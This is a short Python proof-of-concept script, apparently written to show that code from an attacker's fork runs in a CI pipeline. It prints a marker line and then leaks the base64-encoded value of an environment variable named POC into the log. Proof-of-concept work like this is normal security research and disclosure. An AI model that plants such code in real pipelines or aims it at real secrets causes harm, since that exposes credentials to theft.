import os, base64
print("ATTACKER-FORK-CODE-RAN")
print("LEAK=" + base64.b64encode(("poc=" + os.environ.get("POC", "")).encode()).decode())
